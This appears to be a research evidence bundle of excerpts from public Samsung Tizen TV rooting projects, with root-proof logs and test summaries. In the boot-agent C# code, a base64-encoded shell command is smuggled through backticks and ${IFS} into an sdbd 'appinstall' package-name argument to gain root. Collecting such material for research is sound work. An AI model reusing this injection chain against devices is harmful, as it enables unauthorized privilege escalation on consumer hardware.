@@ -1,0 +1,373 @@
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/levkropp--samsung-tv-root-untethered/samsung-tv-root-untethered-2b0629381b3eaf5a78f84332d630d6d4b10681e7/boot-agent/Program.cs
+746:     private static int BridgePort()
+747:     {
+748:         try
+749:         {
+750:             int port;
+751:             return File.Exists(BridgePortConfig)
+752:                 && int.TryParse(File.ReadAllText(BridgePortConfig).Trim(), out port)
+753:                 ? port : DefaultBridgePort;
+754:         }
+755:         catch { return DefaultBridgePort; }
+809:     // M4: true when this boot already rooted (proof newer than boot time).
+810:     private static bool FreshProofThisBoot(out string proofText)
+811:     {
+812:         proofText = null;
+813:         try
+814:         {
+815:             var path = Evidence + "/selfroot-proof.txt";
+816:             if (!File.Exists(path)) return false;
+817:             var boot = BootTimeUtc();
+818:             if (boot != DateTime.MinValue && File.GetLastWriteTimeUtc(path) < boot) return false;
+819:             var text = File.ReadAllText(path);
+820:             if (text.IndexOf("SELFROOT-PROOF uid=0", StringComparison.Ordinal) < 0) return false;
+821:             proofText = text;
+822:             return true;
+823:         }
+827:     public static void RunChain()
+828:     {
+829:         Task.Run(() =>
+830:         {
+831:             var bootStarted = DateTime.UtcNow;
+832:             try
+833:             {
+834:                 Directory.CreateDirectory(Mark);
+835:                 Directory.CreateDirectory(AppHome);
+836: 
+837:                 var status = new StringBuilder();
+878:                     .Append("  cat /proc/self/attr/current\n")
+879:                     .Append("  cp ").Append(AppHome).Append("/SamsungTvArchiveRoot.dll ")
+880:                         .Append(AppHome).Append("/SamsungTvArchiveRoot.runtimeconfig.json ")
+881:                         .Append(AppHome).Append("/public.pem ")
+882:                         .Append(AppHome).Append("/passwd ").Append(Staging).Append("/\n")
+883:                     .Append("  cp ").Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz ")
+884:                         .Append(AppHome).Append("/").Append(Pkg).Append(".tar.gz.signature ")
+885:                         .Append(OnDemand).Append("/\n")
+886:                     .Append("  /usr/bin/dotnet ").Append(Staging)
+887:                         .Append("/SamsungTvArchiveRoot.dll ").Append(Pkg)
+888:                         .Append(' ').Append(Staging).Append(' ').Append(OnDemand).Append('\n')
+889:                     .Append("  echo payload-exit=$?\n")
+890:                     .Append("  sleep 3\n")
+891:                     .Append("  cp /tmp/selfroot-proof.txt \"$EV/selfroot-proof.txt\" 2>/dev/null\n")
+892:                     .Append("  cp /tmp/archive-root-").Append(Pkg).Append(".log \"$EV/payload.log\" 2>/dev/null\n")
+893:                     .Append("  cp ").Append(Mark).Append("/sdb-client.log \"$EV/sdb-client.log\" 2>/dev/null\n")
+894:                     .Append("  echo \"--- evidence ---\"\n")
+895:                     .Append("  ls -la \"$EV\"\n")
+896:                     .Append("} > \"$EV/outer.log\" 2>&1\n")
+897:                     .Append("chsmack -a _ \"$EV\"/* 2>/dev/null\n");
+898:                 File.WriteAllText(AppHome + "/selfroot-launch.sh", outer.ToString());
+899:                 Note("outer script staged (cat|bash, UEP-safe)", 0.08);
+900: 
+901:                 var token = "app" + ((uint)Environment.TickCount).ToString("x8");
+902:                 var wrapped = "/bin/mkdir /tmp/s-" + token + " 2>/dev/null&&{ cat "
+903:                     + AppHome + "/selfroot-launch.sh|bash;}";
+904:                 var encoded = Convert.ToBase64String(Encoding.ASCII.GetBytes(wrapped));
+905:                 var argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
+906:                     + encoded + "|base64${IFS}-d|bash`.tpk";
+907:                 Note("injection armed (" + argument.Length + "/510 bytes)", 0.10);
+916:                 // M4: reopen fast-path — this boot already rooted (fresh
+917:                 // proof newer than boot): skip the injection, go green,
+918:                 // restart the bridge. This is what makes the manager
+919:                 // re-openable as an app instead of a boot-only splash.
+920:                 string existingProof;
+921:                 if (FreshProofThisBoot(out existingProof))
+922:                 {
+923:                     Note("this boot already rooted - chain skipped (fast-path)", 1.0);
+924:                     Persist("fast-path: fresh proof from this boot, chain skipped");
+925:                     try { Note("PROOF:\n" + existingProof, 1.0); } catch { }
+926:                     lock (Gate)
+927:                     {
+928:                         Banner = "ROOT ACQUIRED - UNTETHERED";
+929:                         BannerColor = new Color(0.2f, 1f, 0.3f, 1f);
+930:                         Progress = 1.0;
+931:                     }
+932:                     ProbeBridgeStatus();
+933:                     return;
+934:                 }
+935: 
+936:                 // v4: safe mode — flag file (or the couch override from the
+937:                 // STATUS page) skips the chain and the bridge, next boot.
+938:                 bool uiSafe = false;
+939:                 try { uiSafe = File.Exists(UiSafeMode); } catch { }
+940:                 if (File.Exists(SafeModeFile) || uiSafe)
+941:                 {
+942:                     var safeMsg = "safe-mode present ("
+943:                         + (uiSafe ? "couch override" : SafeModeFile)
+944:                         + "): chain skipped";
+945:                     Note(safeMsg, 0.0);
+946:                     Persist(safeMsg);
+947:                     lock (Gate)
+948:                     {
+949:                         Banner = "SAFE MODE - CHAIN SKIPPED";
+950:                         BannerColor = new Color(1f, 0.6f, 0.2f, 1f);
+951:                         BridgeStatus = "not started (safe mode)";
+952:                     }
+953:                     return;
+960:                 }
+961: 
+962:                 // v4: single-shot chain. sdbd caches the dev host IP at startup
+963:                 // (live flips do nothing), so retrying past its boot window is
+964:                 // pointless — park with a clear status instead of polling forever.
+965:                 Socket s = null;
+966:                 int attempt = 0;
+967:                 while (attempt < SessionAttempts)
+968:                 {
+969:                     attempt++;
+970:                     lock (Gate) { Progress = 0.12; }
+971:                     if (attempt == 1 || attempt % 6 == 0)
+972:                     {
+973:                         Note("sdbd wait " + attempt + "/" + SessionAttempts
+974:                             + " (dev IP must be 127.0.0.1)", 0.12);
+975:                     }
+976:                     if (TrySession(out s)) break;
+977:                     Thread.Sleep(10000);
+978:                 }
+979:                 if (s == null)
+980:                 {
+981:                     Note("no sdbd session in " + SessionAttempts + " attempts", 0.12);
+982:                     lock (Gate)
+983:                     {
+984:                         Banner = "SKIPPED - DEV IP NOT 127.0.0.1?";
+985:                         BannerColor = new Color(0.9f, 0.3f, 0.2f, 1f);
+986:                         BridgeStatus = "not started (no sdb session)";
+987:                     }
+988:                     return;
+989:                 }
+990: 
+991:                 lock (Gate)
+992:                 {
+993:                     Banner = "SDBD SESSION OPEN";
+994:                     BannerColor = new Color(0.4f, 0.8f, 1f, 1f);
+995:                     Progress = 0.35;
+996:                 }
+997:                 Note("sdbd answered localhost handshake (attempt " + attempt + ")", 0.35);
+998: 
+999:                 using (s)
+1000:                 {
+1001:                     s.Send(Frame("OPEN", 0x10, 0, Encoding.ASCII.GetBytes("capability:\0")));
+1060:                     foreach (var proofPath in new[]
+1061:                     {
+1062:                         Evidence + "/selfroot-proof.txt",   // early root-context copy (v5)
+1063:                         "/tmp/selfroot-proof.txt",          // tar launch.sh copy
+1064:                     })
+1065:                     {
+1066:                         try
+1067:                         {
+1068:                             if (!File.Exists(proofPath)) continue;
+1069:                             if (File.GetLastWriteTimeUtc(proofPath) < bootStarted.AddSeconds(-5)) continue;
+1070:                             var text = File.ReadAllText(proofPath);
+1071:                             if (!text.Contains("SELFROOT-PROOF uid=0")) continue;
+1072:                             proof = true;
+1073:                             proofText = text;
+1074:                             break;
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/levkropp--samsung-tv-root-untethered/samsung-tv-root-untethered-2b0629381b3eaf5a78f84332d630d6d4b10681e7/boot-agent/bridge-relay/Program.cs
+22:     private const int DefaultPort = 26103;
+23:     private const string DefaultTokenPath = "/opt/usr/share/selfroot/bridge.conf";
+24:     private const string DefaultLogPath = "/home/researcher/share/tmp/sdk_tools/selfroot-evidence/bridge.log";
+25:     private const int SdbPort = 26101;
+26:     private const int TokenLength = 32;
+27: 
+28:     private static string LogPath = DefaultLogPath;
+29:     private static readonly object LogLock = new object();
+30: 
+31:     public static int Main(string[] args)
+32:     {
+33:         int port = DefaultPort;
+34:         string tokenPath = DefaultTokenPath;
+35:         if (args.Length > 0)
+36:         {
+37:             int parsed;
+38:             if (!int.TryParse(args[0], out parsed) || parsed < 1024 || parsed > 65535)
+39:             {
+40:                 Console.Error.WriteLine("usage: TvRootBridgeRelay [port] [tokenPath] [logPath]");
+41:                 return 2;
+42:             }
+43:             port = parsed;
+44:         }
+45:         if (args.Length > 1) tokenPath = args[1];
+46:         if (args.Length > 2) LogPath = args[2];
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/levkropp--samsung-tv-root-untethered/samsung-tv-root-untethered-2b0629381b3eaf5a78f84332d630d6d4b10681e7/modules/bridge-service/boot.sh
+9: MODULE_DIR=${MODULE_DIR:-/opt/usr/share/selfroot/modules/bridge-service}
+10: EVIDENCE=${EVIDENCE:-/home/researcher/share/tmp/sdk_tools/selfroot-evidence}
+11: UIDIS="/home/researcher/share/tmp/sdk_tools/selfroot-ui/modules/disabled/bridge-service"
+12: if [ -f "$MODULE_DIR/disabled" ] || [ -s "$UIDIS" ]; then
+13:     systemctl stop tvroot-bridge.service >/dev/null 2>&1
+14:     exit 0
+15: fi
+16: RD=/run/systemd/system
+17: cat > $RD/tvroot-bridge.service <<EOF
+18: [Unit]
+19: Description=TVRoot management bridge (token-gated sdb relay)
+20: DefaultDependencies=false
+21: [Service]
+22: Type=simple
+23: ExecStart=/usr/bin/dotnet $MODULE_DIR/TvRootBridgeRelay.dll
+24: Restart=always
+25: RestartSec=5
+26: StartLimitIntervalSec=60
+27: StartLimitBurst=3
+28: EOF
+29: systemctl daemon-reload 2>/dev/null
+30: systemctl restart tvroot-bridge.service 2>/dev/null
+31: systemctl is-active tvroot-bridge.service 2>&1
+32: exit 0
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/DemonKingSwarn--samsung-tv-tizen-root/samsung-tv-tizen-root-ec5a8fcdc22e4014bde24a1970ce4cd4adc823de/ROOTING-RESEARCH.md
+506: ### 8.1 On-device persistence is impossible on this target
+507: 
+508: We searched specifically for a writable location that is executed at boot. There
+509: is none, for four independent reasons.
+510: 
+511: 1. **The boot hooks live on read-only partitions.** `/` is `vdfs ro` (1.4 G, 100 %
+512:    used) and the "product" partition `/prd` is also `vdfs ro` (53 M, 100 % used):
+513: 
+514:    ```
+515:    /dev/root     on /     type vdfs (ro,relatime,posixacl)
+516:    /dev/subroot2 on /prd  type vdfs (ro,relatime,posixacl)
+517:    /dev/mmcblk0p20 on /mnt/systemrw type vdfs (rw,noatime,posixacl,dncs)
+518:    /dev/mmcblk0p21 on /opt        type vdfs (rw,noatime,posixacl,dncs)
+519:    ```
+520: 
+521:    The only writable persistent areas are `/opt` and `/mnt/systemrw`; `/tmp`,
+522:    `/run` and `/var/run` are tmpfs.
+523: 
+524: 2. **systemd has no writable directory on its unit search path.** PID 1 is systemd
+525:    244 and reports:
+526: 
+527:    ```
+528:    UnitPath=/etc/systemd/system /run/systemd/system /run/systemd/generator
+529:             /usr/lib/systemd/system /prd/usr/lib/systemd/system
+530:             /run/systemd/generator.late
+531:    ```
+532: 
+533:    Every entry except the `/run` generators is on a read-only partition. `/opt`
+534:    and `/mnt/systemrw` are *not* searched. We proved this by dropping a probe unit
+535:    into both `/opt/etc/systemd/` and `/opt/usr/share/systemd/system/` (both
+536:    writable), running `systemctl daemon-reload`, and looking for it: `found: 0` in
+537:    each case.
+538: 
+539:    The unit files that *do* watch writable paths (e.g. `tts-download-service.path`,
+540:    `vdtizen-bootseq-*.path`) only trigger fixed, signed binaries — none of them
+541:    runs a script from a directory we control.
+542: 
+543: 3. **Unsigned code will not run.** The kernel UEP rejects unsigned native
+544:    executables (`[uep][bash] the file is NOT signed!!`), and Tizen refuses to
+545:    install an unsigned package. The only unsigned-code primitive we have (managed
+546:    code via the signed `/usr/bin/dotnet`) still must be *invoked*, which needs a
+547:    boot hook.
+548: 
+549: 4. **Writable boot state is volatile.** `/run/systemd/system` *is* on the unit
+550:    path and writable, but it is tmpfs, so anything placed there is gone after the
+551:    next boot by design.
+552: 
+553: Persistence on this target therefore cannot be "drop a file and forget it"; it
+554: must be re-armed from outside the TV after every boot — exactly what upstream
+555: does.
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/chris-ritsen--samsung-tv-root/samsung-tv-root-3b97edf3762db7670585d73e29623dc56195bf98/src/samsung_tv_root/root_agent.py
+495:         peer_host = str(peer[0]) if peer else ""
+496:         if peer_host != self.expected_peer or accepted is None or accepted.done():
+497:             await _close_writer(writer)
+498:             return
+499:         _configure_keepalive(writer)
+500:         nonce = secrets.token_bytes(32)
+501:         writer.write(f"{PROTOCOL_VERSION}\t{nonce.hex()}\n".encode("ascii"))
+502:         await writer.drain()
+503:         try:
+504:             line = await _read_frame(reader, DEFAULT_COMMAND_TIMEOUT)
+505:             payload = verify_authenticated_frame(self.secret, nonce, line)
+506:             identity = _parse_auth(payload)
+507:             if self.require_root and any(
+508:                 value != 0
+509:                 for value in (identity.uid, identity.euid, identity.gid, identity.egid)
+510:             ):
+511:                 raise RootAgentAuthenticationError(
+512:                     "agent connected without root identity: "
+513:                     f"uid={identity.uid} euid={identity.euid} "
+514:                     f"gid={identity.gid} egid={identity.egid}"
+515:                 )
+FILE ${S95F_EVIDENCE_ROOT}/research-20261027-external/sources/root-sources/chris-ritsen--samsung-tv-root/samsung-tv-root-3b97edf3762db7670585d73e29623dc56195bf98/src/samsung_tv_root/archive_root.py
+68: def _runtime(client: SdbClient) -> str:
+69:     result = client.capture("/usr/bin/dotnet --list-runtimes")
+70:     if "[exit:0]" in result.output:
+71:         runtimes = result.output.split("\n[exit:0]", 1)[0]
+72:         versions = [
+73:             (int(match.group(1)), int(match.group(2)))
+74:             for line in runtimes.splitlines()
+75:             if (match := re.match(
+76:                 r"Microsoft\.NETCore\.App (\d+)\.(\d+)\.\d+\s+\[", line
+77:             ))
+78:         ]
+79:     elif (
+80:         "Unknown option --list-runtimes" in result.output
+81:         and "[exit:255]" in result.output
+82:     ):
+83:         active = _capture(client, "readlink -f /usr/share/dotnet.tizen/netcoreapp")
+84:         match = re.fullmatch(
+85:             r"(\d+)\.(\d+)\.(\d+)", PurePosixPath(active).name
+86:         )
+87:         if match is None:
+88:             raise ArchiveRootError(f"unexpected active .NET runtime path: {active}")
+89:         _capture(
+90:             client,
+91:             "test -r /usr/share/dotnet.tizen/netcoreapp/libcoreclr.so && "
+92:             "test -r /usr/share/dotnet.tizen/netcoreapp/System.Private.CoreLib.dll",
+93:         )
+94:         versions = [(int(match.group(1)), int(match.group(2)))]
+95:     else:
+96:         raise ArchiveRootError(
+97:             f"SDK command failed: /usr/bin/dotnet --list-runtimes: "
+98:             f"{result.output.strip()}"
+99:         )
+100:     if any(major >= 6 for major, _ in versions):
+101:         return "6.0"
+102:     if (3, 1) in versions:
+103:         return "3.1"
+104:     raise ArchiveRootError("no supported Microsoft.NETCore.App runtime (3.1 or 6+)")
+105: 
+106: 
+107: def _check_target(client: SdbClient, runtime: str | None = None) -> TargetAssessment:
+108:     if runtime is not None and runtime not in ("3.1", "6.0"):
+109:         raise ArchiveRootError(f"unsupported explicit runtime: {runtime}")
+110:     client.connect()
+111:     client.require_device()
+112:     client.require_shell_injection()
+113:     capabilities = _capture(client, "getcap /usr/bin/dotnet /usr/sbin/sdbd-tarlauncher")
+114:     lines = capabilities.splitlines()
+115:     dotnet = next((line for line in lines if "/usr/bin/dotnet" in line), "")
+116:     launcher = next(
+117:         (line for line in lines if "/usr/sbin/sdbd-tarlauncher" in line), ""
+118:     )
+119:     dotnet_caps = _file_capabilities(dotnet)
+120:     launcher_caps = _file_capabilities(launcher)
+121:     if not all(
+122:         "e" in dotnet_caps.get(name, "") for name in ("cap_setgid", "cap_sys_admin")
+123:     ):
+124:         raise ArchiveRootError("dotnet lacks effective SETGID/SYS_ADMIN capabilities")
+125:     if not all(
+126:         "e" in launcher_caps.get(name, "") for name in ("cap_setgid", "cap_setuid")
+127:     ):
+128:         raise ArchiveRootError(
+129:             "sdbd-tarlauncher lacks effective SETUID/SETGID capabilities"
+130:         )
+131:     runtime_source = "explicit" if runtime is not None else "detected"
+132:     runtime = runtime or _runtime(client)
+133:     tar_options = _capture(client, "/usr/bin/tar --help | grep -- --to-command")
+134:     if "--to-command" not in tar_options:
+135:         raise ArchiveRootError("TV tar does not support --to-command")
+136:     return TargetAssessment(
+137:         capabilities, _capture(client, SYSTEM_HASH_COMMAND), runtime, runtime_source
+RETAINED TARGET SUMMARY ${S95F_EVIDENCE_ROOT}/live-cast/boot-suitability.summary
+{"label": "User::Pkg::com.samsung.tv.ghservice", "child": null, "code": null, "error": "Win32Exception: An error occurred trying to start process '/usr/bin/dotnet' with working directory '/'. Permission denied"}
+Uid:	5001	5001	5001	5001
+Gid:	100	100	100	100
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+ORIGINAL_RESTORED
+3ce6c9b3eafd039728b2471e8349fedd5d3de5598ebec10d8425f716aef034e4  /opt/usr/apps/com.samsung.tv.ghservice/bin/com.samsung.tv.ghservice.dll
+RETAINED TARGET SUMMARY ${S95F_EVIDENCE_ROOT}/live-cast/boot-socket-test.summary
+{"label": "User::Pkg::com.samsung.tv.ghservice", "child": null, "code": null, "error": "Win32Exception: An error occurred trying to start process '/usr/bin/dotnet' with working directory '/'. Permission denied", "socketTest": "Loopback SDB bytes=0 frame=", "listenerTest": "LAN listener permitted"}
+Uid:	5001	5001	5001	5001
+Gid:	100	100	100	100
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+ORIGINAL_RESTORED
+3ce6c9b3eafd039728b2471e8349fedd5d3de5598ebec10d8425f716aef034e4  /opt/usr/apps/com.samsung.tv.ghservice/bin/com.samsung.tv.ghservice.dll
